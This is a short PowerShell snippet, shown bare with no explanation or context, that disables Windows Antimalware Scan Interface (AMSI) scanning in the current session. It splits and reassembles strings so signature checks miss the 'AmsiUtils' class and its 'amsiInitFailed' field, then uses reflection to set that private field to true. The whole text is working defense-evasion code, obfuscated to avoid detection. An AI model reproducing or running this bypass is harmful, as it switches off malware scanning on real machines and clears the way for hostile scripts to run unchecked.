$a = 'System.Management.Automation.A';$b = 'ms';$c = 'Utils'
$d = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$c))
$e = $d.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$e.SetValue($null,$true)